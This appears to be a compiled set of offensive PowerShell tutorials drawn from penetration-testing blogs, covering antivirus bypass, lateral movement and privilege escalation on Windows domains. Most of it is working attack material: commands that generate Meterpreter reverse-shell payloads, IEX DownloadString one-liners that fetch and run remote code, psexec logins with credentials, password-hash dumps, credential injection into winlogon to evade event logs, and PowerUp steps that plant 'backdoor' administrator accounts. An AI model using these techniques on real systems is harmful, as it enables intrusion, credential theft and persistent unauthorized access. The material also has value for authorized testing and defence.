+Meanwhile back at the bat cave...
+
+
+
+
+
+
+
+#####################################
+#Bypassing Antivirus with PowerShell#
+#####################################
+
+Reference:
+https://www.fishnetsecurity.com/6labs/blog/bypassing-antivirus-powershell
+
+On a recent penetration test, I ran into a number of challenges overcoming antivirus on compromised machines. Although I had already obtained domain administrator credentials, a number of roadblocks existed that prevented me from traversing the internal network:
+
+Remote Desktop was disabled on roughly 75% of the Windows servers. Although I had a clear-text password, I could not leverage RDP to interact with the systems.
+Antivirus was preventing all of my commonly used payloads from executing. Including all my attempts at using Metasploit's meterpreter, shell, upexec, exec, etc. modules. Manual encoding of custom PE files also failed to bypass AV.
+To fully leverage the domain admin credentials, I needed a reliable method to access all the Windows servers on the network without interference from Antivirus. Without RDP, I needed to accomplish this through SMB.
+
+The solution I present below accomplishes this task by utilizing SysInternals psexec to gain a remote command prompt on the victim. Utilizing this command prompt, I then execute a set of PowerShell commands to upgrade my access to a Meterpreter shell all the while staying hidden from Antivirus. The techniques presented here, while not likely to be bleeding edge, attempt to consolidate a number of disjoint topics into a useful penetration testing scenario.
+
+Challenge
+
+There are a number of challenges that need to be overcome. Of course, evading antivirus is the ultimate challenge. However, limitations in the number of characters that can be passed via the Windows command prompt presents another challenge that needs to be considered. Additionally, PowerShell may limit a user's ability to execute scripts via its Execution Policy. Although this can be changed, I generally prefer to avoid altering the target machine.
+
+Here's how I'll be overcoming these challenges:
+
+Evading Antivirus: Execute the Meterpreter shellcode in memory to avoid AV signature detection
+Execution Policy Preventing the Execution of PowerShell Scripts: Execute the commands via the -command and -encodedCommand PowerShell switches
+Limitations on Windows Command Length: I'll split the commands up into multiple steps and, where needed, execute them using a PowerShell variable which does not have the same size restriction
+Overview
+
+The process, as I executed it, loosely adheres to the following steps:
+
+Generate the Meterpreter payload, encode it, and save it within an accessible location on the attacking machine (e.g. Apache's /var/www directory).
+Start a Meterpreter listener on the attacking machine
+Utilize SysInternals psexec to obtain a command prompt on the target machine
+From the command prompt, execute a PowerShell command to download the payload generated in step one.
+From the command prompt, execute another PowerShell command which reads in our payload and executes the encoded version of it.
+The Setup
+
+In my scenario, there are 3 machines in play:
+
+The Windows target - 192.168.3.93
+The attacker's Strategicsec Ubuntu machine - Strategic-Sec-Ubuntu-VM-IP
+The attacker's Windows machine (used for running psexec standalone). Running as a VM - IP address is inconsequential.
+The Preparation
+
+Let's get started. Let's start by generating a PowerShell script which executes our Meterpreter payload. This is simple by using msfpayload and msfencode:
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=Strategic-Sec-Ubuntu-VM-IP LPORT=443 R | msfencode -t psh -a x86
+
+While it's fresh on our minds, start the multi/handler in Metasploit to listen on Strategic-Sec-Ubuntu-VM-IP:443.
+
+Although there's likely a quicker way to do the next steps, I chose to utilize my Windows VM. Start by copying the PSH script that was output above. In a Windows command prompt, perform the following:
+
+c:\> powershell
+
+PS c:\> $cmd = '<PASTE THE CONTENTS OF THE PSH SCRIPT HERE>'
+
+PS c:\> $u = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+
+PS c:\> $e = [Convert]::ToBase64String($u)
+
+PS c:\> $e
+
+The above converts our script to Unicode and then Base64 encodes it. A couple of notes... Replace everything in red above (including the '<' and '>' characters) with the script generated by msfpayload/msfencode. This will be a multiline command. Ensure the single quotes are present. You may have to press "Enter" a few times after typing the closing single quote.
+
+The last line in the PowerShell series simply prints the encoded payload to the screen. Copy this value and clean it up by removing all new lines. Your encoded data must not span multiple lines.
+
+Save the cleaned up, encoded payload on the attacking machine under a directory served by Apache (or whatever web server you prefer). In my case, I'll save it as "shell.txt" in /var/www. Start your web server and verify that the file is accessible.
+
+The Execution
+
+On your Windows machine, lets get a remote command prompt on the target (this assumes that you have valid credentials on the target).
+
+c:\> psexec \\10.1.1.10 -u domain\jdoe -p s3cr3t cmd.exe
+
+With all the setup in place, we'll now proceed to download our encoded payload and execute it.
+
+In the command prompt we just obtained, enter the following to download our encoded payload:
+
+c:\> powershell -noprofile -noninteractive -command "& {$client=new-object System.Net.WebClient;$client.DownloadFile('http://10.1.1.20/shell.txt','c:\windows\temp\_shell.txt')}"
+
+For those of you familiar with WGET, the above basically duplicates that functionality. It downloads the file "shell.txt" from http://10.1.1.20 (our attacking machine with the web server running) and saves it to c:\windows\temp\_shell.txt on the target server.
+
+Now that we have the encoded shellcode on the target machine, we can execute the following from the same command prompt.
+
+c:\> powershell -noprofile -noninteractive -noexit -command "& {$cmd=type 'c:\windows\temp\_shell.txt';powershell -noprofile -noninteractive -noexit -encodedCommand $cmd}"
+
+While there are likely more efficient ways to accomplish this command, what it's doing is grabbing the contents of our encoded shellcode and storing it in a variable (via the 'type' command). It then executes an additional PowerShell command. By using the -encodedCommand switch we can pass it our encoded shellcode. This allows us to execute the script via a command line rather than a script (which avoids any ExecutionPolicy restrictions). Additionally, storing the payload in the $cmd variable allows us to bypass command length restrictions of the command prompt.
+
+Success
+
+Depending on your connection speed, the above command may take some time to execute. When it's complete, we are greeted with the sweet site of a new Meterpreter session untouched by AV...
+
+[*] Sending stage (752128 bytes) to 10.1.1.10
+[*] Meterpreter session 3 opened (10.1.1.20:443 -> 10.1.1.10:2214) at 2012-08-21 09:06:50 -0400
+
+meterpreter > getuid
+Server username: domain\jdoe
+meterpreter > sysinfo
+Computer : VICTIMSVR
+OS : Windows .NET Server (Build 3790, Service Pack 2).
+Architecture : x86
+System Language : en_US
+Meterpreter : x86/win32
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d<snip>3:::
+jdoe:500:aad3b435b51404eeaad3b435b51404ee:d<snip>3:::
+
+
+
+
+
+
+#########################################################
+#Authenticated Metasploit Payloads via Powershell Psexec#
+#########################################################
+
+Reference:
+http://securitypadawan.blogspot.com/2013/07/authenticated-metasploit-payloads-via.html
+
+I love powershell and in a windows environment, powershell is king. Add the ability to perform native code injection and sprinkle in some metasploit and the possibilities are endless. There is a really awesome collection of tools called Powersploit by @mattifestation . These are powershell scripts that take advantage of "features" of powershell to do some cool stuff.
+
+@obscuresec is also a contributor to the powersploit project, and not too long ago he had a really cool blog post detailing one way to execute a meterpreter payload within a powershell process. I thought this idea was really cool so I decided to try and take a stab at writing a metasploit module that implements a slightly modified version of this technique.
+
+Many times in a penetration test I find myself having valid credentials to a target machine, but my payload keeps getting busted when I try and upgrade my shell to meterpreter.
+
+This module allows you to use metasploit's existing powershell encoded payloads, or you can specify a file to use that contains a powershell script (such as powersploit) that will be executed on the target machine within the powershell process using the LPATH variable.
+
+At the very minimum, will need to set the LHOST, RHOST, ARCH, SMBUSER and SMBPASS variables.
+
+And if all goes as planned...
+
+Also we can see that the only thing spawned on the target machine is one powershell process:
+
+You can find the module on github https://github.com/jakxx/metasploit-framework/blob/powershell_psexec/modules/exploits/windows/powershell/powershell_psexec.rb.
+
+
+################################################
+#PowerSploit: The Easiest Shell You’ll Ever Get#
+################################################
+
+Reference:
+https://www.pentestgeek.com/2013/09/18/invoke-shellcode/
+
+Sometimes you just want a shell. You don’t want to worry about compiling a binary, testing it against antivirus, figuring out how to upload it to the box and finally execute it. Maybe you are giving a demo of an awesome new Meterpreter post-exploitation module. Maybe you have less than a minute of physical access to a Windows kiosk machine and need a quick win. There are plenty of scenarios that end in a penetration tester gaining GUI access to a target machine through guessed or found RDP, ESX or VNC credentials. In those situations, the easiest way to get a Meterpreter shell without worrying about AV is with PowerSploit.
+
+PowerSploit  is a collection of security-related modules and functions written in PowerShell. PowerSploit is already in both BackTrack and Kali, and its code is utilized by other awesome tools like SET  so you may already be using it!  Many of the scripts in the project are extremely useful in post-exploitation in Windows environments.  The project was started by Matt Graeber who is the author of the function we will use in this tutorial: Invoke-Shellcode.
+
+
+In order for this to work, the target machine must have PowerShell installed and internet access. The first step is for us to set up our handler on our attacker box. This is something we will likely do often, so let’s automated it with a really simple Python script:
+
+script PowerSploit: The Easiest Shell Youll Ever Get
+
+To start the multi/handler and configure it, we just run the script:
+
+python StartListener.py 192.168.0.15 443
+
+Now that our handler is ready, we can move on to executing our shell.  The first thing I did to make the next step easier to type is shorten the github link to Invoke-Shellcode with bitly:
+
+bitly PowerSploit: The Easiest Shell Youll Ever Get
+
+Next, we need to run two commands in a PowerShell prompt to get our Meterpreter shell. The first command will create a .Net WebClient Object to download the function and pass it to Invoke-Expression to put it into memory:
+
+IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’)
+
+Now we just need to make a call to the Invoke-Shellcode function with the relevant parameters from the listener:
+
+Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 192.168.0.15 –Lport 443 –Force
+
+We can actually combine these commands to run a single command to execute our shell:
+
+IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’); Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 172.0.1.200 –Lport 443 –Force
+
+powershell PowerSploit: The Easiest Shell Youll Ever Get
+
+Once we get the prompt back, we can safely close PowerShell because the ultra-useful Smart_Migrate Meterpreter script has safely landed us in a new process:
+
+meterpreter PowerSploit: The Easiest Shell Youll Ever Get
+
+That is the easiest and most convenient AV-bypass I have ever seen!  Just open PowerShell and type a command.  Hopefully this post has shown you one way PowerSploit can make your life as a pen-tester easier.  You can find more ways at my  blog and by following me on twitter.  Also, join me at Derbycon when I will talk about the Pass-the-Hash attack and some simple mitigations with Skip Duckwall and how to use PowerSploit and Windows tools to accomplish post-exploitation tasks without uploading binaries with Matt Graeber.  I hope to see you all there!
+
+
+
+
+#############################################
+#Injecting Logon Credentials With PowerShell#
+#############################################
+
+Reference:
+http://clymb3r.wordpress.com/2013/11/17/injecting-logon-credentials-with-powershell/
+
+In this article I will introduce a new script, Inject-LogonCredentials, that uses PowerShell (specifically, the Invoke-ReflectivePEInjection script) to inject credentials in memory.
+
+I’ll start with a brief review of the current commonly used methods of using stolen credentials.
+
+Doing a RunAs with a users credential. The downside of a RunAs is that it creates an “Explicit Credential Logon” event in the Windows event logs (event id 4648). As you can see in the picture below, this event shows the account being logged in with (testuser), and the account initiating the new logon (joe). It also shows the process that called the logon API. Incident responders commonly look for this event as an indicator of lateral movement, so it should be avoided.
+Injecting credentials directly in to LSASS. This technique, used by Windows Credential Editor, involves injecting a DLL in to LSASS and modifying its memory to add your credentials. Unfortunately, if LSASS is set to be a protected process in Windows 8.1 this technique fails because only specially signed processes can manipulate protected processes. While it is true that tools such as Mimikatz can disable protected processes, I do not want to load a kernel driver (which is what Mimikatz does) every time I pivot.
+Implementing your own authentication protocols. Examples include the NTLM module in Metasploit, which can perform NTLM authentication without relying on Windows authentication. This has the benefit of staying out of the logs (since it does not rely on Windows authentication libraries). Unfortunately it limits you to using Metasploit modules that use the Metasploit NTLM module. This module only supports NTLM, and not Kerberos. One new feature of Windows 8.1 allows user accounts to be banned from using NTLM, which will prevent this module from functioning.
+As noted, doing a RunAs throws a suspicious event log because it allows an incident responder to see that some random user is logging in with domain admin credentials (or other privileged credentials). Instead of simply doing a RunAs, I will do the following:
+
+Create a DLL that:
+Opens a named pipe and reads a domain/username/password combination.
+Read a logon type from the named pipe (current supported types are Interactive, RemoteInteractive, and NetworkCleartext).
+Calls LsaLogonUser to create a logon with the credentials it was supplied, and as the logon type supplied.
+Impersonates the token returned by LsaLogonUser with its current thread, which allows the token to be kidnapped by Invoke-TokenManipulation.
+Reflectively inject this DLL in to winlogon.exe using Invoke-ReflectivePEInjection.
+Supply the DLL with the username/password to create a logon for by using a named pipe.
+Call LsaLogonUser with the supplied credentials and logon type within winlogon.exe.
+The differences between this script and a normal RunAs are:
+
+Process calling the logon API will show up as Winlogon.exe.
+User initiating the logon is SYSTEM, not a random user account.
+You can specify the logon type. For example, you can make LSASS think the account is connecting via RDP, which might be normal. You can also make LSASS think the account is a local logon (someone physically using the computer).
+
+RunAs 4648 Event Log
+RunAs 4648 Event Log
+
+4648 Event Log With Inject-LogonCredentials
+4648 Event Log With Inject-LogonCredentials
+
+4624 With Inject-LogonCredentials
+4624 With Inject-LogonCredentials
+
+As you can see, everything that was suspicious in the 4648 event log is gone. But how do you use these credentials now that they are in memory?
+
+Once you run the script, you can use Invoke-TokenManipulation (or incognito if you are using Metasploit) to kidnap the token of the new logon. You can use this impersonated token to pivot off box using things such as SMB, WMI, and PowerShell remoting.
+
+Here’s an example:
+
+Inject-LogonCredentials –DomainName demo –UserName administrator –Password Password1 –ExistingWinLogon
+Invoke-TokenManipulation –CreateProcess “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -UserName “demo\administrator”
+
+It’s worth mentioning that the script currently has two modes:
+
+ExistingWinLogon: Injects the DLL in to an already running winlogon process. The DLL will never be unloaded from this process so there is forensic evidence that is left behind if someone does analysis on the winlogon process.
+NewWinLogon: Creates a new winlogon process, running as SYSTEM, using token kidnapping. Injects the logon DLL in to this new winlogon process. Once you are done, you can kill the process. This allows you to delete the process and wipe away DLL injection evidence, but Windows will log that PowerShell.exe created winlogon, which would look strange if anyone notices.
+Hopefully this has helped illustrate how Invoke-ReflectivePEInjection can be used to do awesome things.You can find the script at: 
+https://github.com/clymb3r/PowerShell/tree/master/Inject-LogonCredentials
+
+As usual, it will also be added to PowerSploit.
+
+###############################
+#Veil-PowerView: A Usage Guide#
+###############################
+
+Reference:
+http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/
+
+[Note: this topic was cross-posted on the Veil-Framework site (https://www.veil-framework.com/veil-powerview-usage-guide/)]
+
+Veil-PowerView (https://www.veil-framework.com/veil-powerview/)is a project that was originally prompted by a client who locked down their corporate machines by disabling all “net *” commands for normal users. While building pure Powershell replacements to easily bypass this protection, I began to explore what else could be done with Powershell from a domain and network situational awareness perspective. Being inspired by my boss @davidpmcguire, and drawing on existing work from @mubix, the offensive Powershell community (@obscuresec, @mattifestation, and DarkOperator), and the authors of various Metasploit modules like local_admin_search_enum, I began to build more interesting functionality to abuse Windows domains. Now that Veil-PowerView has been tested in multiple, diverse environments and has started to mature a bit, I wanted to put together a quick guide on using some of PowerView’s interesting functionality.
+
+First, some basic usage: to get the most out of PowerView, you need a current Windows workstation with domain credentials. The credentials don’t need to be privileged, as many of the API methods abused by the tool only need basic user access. To load up PowerView, first download the raw powerview.ps1 (https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1) script to a local location, and then launch Powershell:
+
+C:> powershell.exe -nop -exec bypass
+Then import the PowerView module with the following:
+
+PS C:\> Import-Module [full path to powerview.ps1]
+All of the PowerView cmdlets will now be exposed and tab completable (Invoke-[tab]). To get more information on any command, use get-help [cmdlet], with an optional -full flag to return complete information. I.E. “Get-Help Invoke-Netview -full“. To get a list of all the available functions, check the README.md. Arguments/flags for each cmdles should be tab completable, with something like “Invoke-Netview -[tab]“. If you want to output your results to a file, I recommend using the Powershell Out-File cmdlet, I.E. ​”PS C:\> Invoke-Netview | Out-File -Encoding ASCII output.txt” (the -encoding flag is used since since Powershell defaults to Unicode). If you want detailed output for any of the PowerView commands, just add a “-Debug” flag, and if you want status output for any functions that enumerate multiple machines use “-Verbose”.
+
+Now, on to the fun stuff. PowerView provides replaces for almost all Windows net commands, letting you query users, machines, domain controllers, user descriptions, share, sessions, and more. The Get-Net* cmdlets should cover most of your needs. For example, the Get-NetComputers cmdlet will let you search for all systems in the domain, and you can provide wildcard searches for the -HostName, -OperatingSystem, and -ServicePack. If you want to use this find all Windows XP boxes on the domain, run:
+
+PS C:\> Get-NetComputers -OperatingSystem *xp*
+Since we can search for operating systems and service packs, let’s take this one step further. How about finding all machines likely vulnerable to MS08-067, ping them and return any hosts that are up? There’s a function for that:
+
+PS C:\> Invoke-FindVulnSystems -Ping
+One of the common things we do on assessments is check for overly permissive file shares that our current user can read. This used to be a pretty manual process, but now we can automate it easily. The following command will query AD for machines using Get-NetComputers, ping each machine to ensure it’s up and responsive, get a list of available shares for each machine using Get-NetShare, exclude PRINT$ and IPC$ from the output, and check if the current user has read access:
+
+PS C:\> Invoke-ShareFinder -Ping -ExcludePrint -ExcludeIPC -CheckShareAccess 
+Invoke-Netview is a port of Rob Fullers’s netview.exe tool. It uses native Windows API commands to get the sessions, shares, and loggedon users for target machines, often without needing administrative credentials. The following command will query AD for machines using Get-NetComputers, ping each machine to ensure it’s up and responsive, and wait for a delay of 10 seconds between touching each machine:
+
+PS C:\> Invoke-Netview -Ping -ExcludeShares -Delay 10
+A really useful thing on an assessment is to know where particular users are logged in. Say you compromise a user that has administrative access to local desktops on a domain. You can use functionality in PowerView to find where high value users (default “Domain Admins”) are logged in, and can even check if you have local admin on the found machines! The following command will query AD for machines using Get-NetComputers, ping each machine to ensure it’s up and responsive, query AD for members of the “Domain Admins” group, and then check if any users currently logged in/have a sessions on a machine match the target user list. Locations where Domain Admins are located are then displayed:
+
+PS C:\> Invoke-Userhunter -Ping
+If you want to hunt for a specific user or userlist, or use a pre-populated host list instead of querying AD, there are flags for those actions as well:
+
+PS C:\> Invoke-UserHunter -UserName “jsmith” -HostList hosts.txt
+An even stealthier way to find where target users are located is to find all the file servers mounted by users from their homeDirectory fields, and run a Get-NetSessions command on the found file servers. This will give you a large amount of information on most corporate networks with a minimal amount of traffic! Invoke-StealthUserHunter can automate all of this for you nicely:
+
+PS C:\> Invoke-StealthUserhunter -GroupName “Server Admins”
+There are plenty of more functions and options in Veil-PowerView than what we covered here: I encourage you to check out PowerView’s README.md as well as the descriptive comments for each cmdlet in the source which detail use cases, arguments and outputs for each function.
+
+If you need to invoke PowerView in a non-interactive context, there are a few additional launching options. If you know the function and arguments you want to run (like Invoke-Netview) you can append the function name to the end of the PowerView file and run it with:
+
+C:\> powershell.exe -nop -exec bypass .\powerview.ps1​ > output.txt
+You can also run it straight without any script modifications with:
+
+C:\> powershell.exe -exec bypass -Command “& {Import-Module .\powerview.ps1; Invoke-Netview | Out-File -Encoding ascii output.txt}”
+If you want to invoke everything without touching disk, use something like this:
+
+C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mYPUO4′); Invoke-NetView -Ping | Out-File -Encoding ascii netview.txt“
+There’s also a Metasploit module for running powershell commands through a session, post/windows/manage/powershell/exec_powershell. Before you use this module, first append the desired function and any arguments (i.e. “Invoke-StealthUserHunter”) to the end of powerview.ps1 on your attacker machine, and then specify the local path to the script in the module options. Metasploit will upload the script, run it on the target, retrieve the results and save them back to your local machine.
+
+If you have any questions on PowerView, hit me up at will [at] harmj0y.net, on twitter at @harmj0y, Freednode (harmj0y in #veil or #armitage), submit an issue on the official Github page, or come check out the Veil-Framework at BlackHat Arsenal.
+
+
+
+########################
+#PowerUp: A Usage Guide#
+########################
+
+Reference:
+http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+
+Note: this topic was cross-posted on the official Veris Group blog (http://www.verisgroup.com/2014/06/17/powerup-usage/).
+
+PowerUp (http://www.harmj0y.net/blog/powershell/powerup/) is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system. We’ve gotten the chance to test PowerUp in multiple environments, as well integrate public feedback, so I wanted to put together a quick usage guide for those wanting to check it out.
+
+To load up PowerUp, first download the raw script (https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1) to a local location, and then launch Powershell:
+
+
+
+C:> powershell.exe -nop -exec bypass
+Then import the PowerUp module with the following:
+
+PS C:\> Import-Module .\PowerUp.ps1
+All of the PowerUp cmdlets will now be exposed and tab completable (Get-[tab]). To get more information on any command, use get-help [cmdlet], with an optional -full flag to return complete information. I.E. “Get-Help Get-ServiceEXEPerms -full“. To get a list of all the available functions, check the README.md (https://github.com/HarmJ0y/PowerUp/blob/master/README.md). If you want to output your results to a file, I recommend using the Powershell Out-File cmdlet, I.E. ​”PS C:\> Get-ServicePerms | Out-File -Encoding ASCII checks.txt” (the -encoding flag is used since since Powershell defaults to Unicode).
+
+The most common way I end up using PowerUp is by using the Invoke-AllChecks function, which runs through all relevant checks for the machine and outputs a status report:
+
+PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+Sidenote: there are a few other ways you can run the Invoke-AllChecks functionality in the field, particularly over a Meterpreter (or Beacon) agent. One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:
+
+C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
+If you want to invoke everything without touching disk, use something like this:
+
+C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+There’s also a Metasploit module for running powershell commands through a session, post/windows/manage/powershell/exec_powershell. Before you use this module, first append “Invoke-AllChecks” to the end of PowerUp.ps1 on your attacker machine, and then specify the local path to the script in the module options. Metasploit will upload the script, run it on the target, retrieve the results and save them back to your local machine.
+
+Now, let’s take a look at that example report:
+
+Running Invoke-AllChecks
+Checking for unquoted service paths...
+[+] Unquoted service path: CustomSVC - C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe
+Checking service executable permissions...
+[+] Vulnerable service executable: CustomSVC - C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe
+Checking service permissions...
+[+] Vulnerable service: CustomAPP - C:\Custom\deploy.exe
+Checking for unattended install files...
+[+] Unattended install file: C:\Windows\Panther\Unattended.xml
+Checking %PATH% for potentially hijackable service .dll locations...
+Checking for AlwaysInstallElevated registry key...
+[+] AlwaysInstallElevated is enabled for this machine!
+Checking for Autologon credentials in registry...
+We definitely have some interesting output to check out here. The first thing I could check out is the unattended installation file at C:\Windows\Panther\Unattended.xml- this file might have a base64-encoded deployment password that would give us a quick win.
+
+The next up is the vulnerable service executable. This misconfiguration happens when the executable associated with a service has improper permissions, allowing other users to write to the .exe. Since these services run as SYSTEM, if we replace the exe with our own, we can escalate quickly. PowerUp includes a function to easily back up the service .exe and write out a patched C# service to that service location. If it succeeds, it returns True, and returns False if it fails. We can use the -Verbose flag to get some more information:
+
+PS C:\> Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose
+VERBOSE: Backing up ‘C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe’ to ‘C:\Users\adam\Documents\Visual Studio
+2008\Projects\Service\Service\bin\Release\service.exe.bak’
+VERBOSE: Service binary written out to ‘C:\Users\adam\Documents\Visual Studio 2008\Projects\Service\Service\bin\Release\service.exe’
+True
+This new service binary will create a new user named backdoor, and add them to the local administrators. If we can’t start/stop the service, rebooting the box should do the trick to get the user added. After the user is added, running Restore-ServiceEXE -ServiceName CustomSVC should place the original binary back in its proper place.
+
+Sometimes services themselves are vulnerable- if we can modify a service and start/stop it, we can change the path name to the service exe to be something like “net user backdoor2 /add”. If we start/stop the service and then repeat that process to add the user to the local administrators, we’re golden:
+
+PS C:\> Invoke-ServiceUserAdd -ServiceName CustomAPP -UserName backdoor2 -Password password123 -Verbose
+VERBOSE: Service ‘CustomAPP’ original path: ‘C:\Custom\deploy.exe’
+VERBOSE: Service ‘CustomAPP’ original state: ‘Stopped’
+VERBOSE: Adding user ‘backdoor2′
+VERBOSE: Adding user ‘backdoor2′ to group ‘Administrators’
+VERBOSE: Restoring original path to service ‘CustomAPP’
+VERBOSE: Leaving service ‘CustomAPP’ in stopped state
+True
+Finally, let’s check out that AlwaysInstallElevated key. This is a key sometimes set by enterprises in an attempt to simply the deployment of installer packages without granting users administrative rights. However, setting this key actually is the exact same as giving users those rights, as writing out a custom .msi installer and running it will give the user elevated privileges:
+
+PS C:\> Write-UserAddMSI
+Service binary written out to ‘UserAdd.msi’
+True
+When we run this .msi, it gives us a gui to add a local admin:
+
+UserADD.msi
+
+
+#######################################
+#Cannot be reproduce everything below #
+#######################################
+
+http://ezine.echo.or.id/issue28/005.txt 
+http://trwagner1.wordpress.com/2012/01/03/powershell-and-wireshark/
+https://www.fishnetsecurity.com/6labs/blog/cryptolocker-prevention-and-remediation-techniques
+
+#############
+# SharpPcap #
+#############
+
+Reference:
+http://poshcode.org/5374
+
+SharpPcap is a cross-platform packet capture framework for the .NET environment, based on the famous pcap / WinPcap libraries. It provides an API for capturing, injecting, analyzing and building packets using any .NET language such as C# and VB.NET.
+
+# First, you have to install WinPcap
+# http://www.winpcap.org/install/default.htm
+
+# Then, you have to download SharpPcap
+# http://sourceforge.net/projects/sharppcap/
+
+# And you need to import the assembly from wherever you put it
+Add-Type -Path C:\ps\SharpPcap-4.2.0.bin\SharpPcap-4.2.0\Release\SharpPcap.dll
+
+http://poshcode.org/get/5374
+
+(new-object System.Net.WebClient).DownloadFile("http://poshcode.org/get/5374", "c:\ps\SharpPcap.ps1")
+
+http://pastebin.com/cM8zRq7C
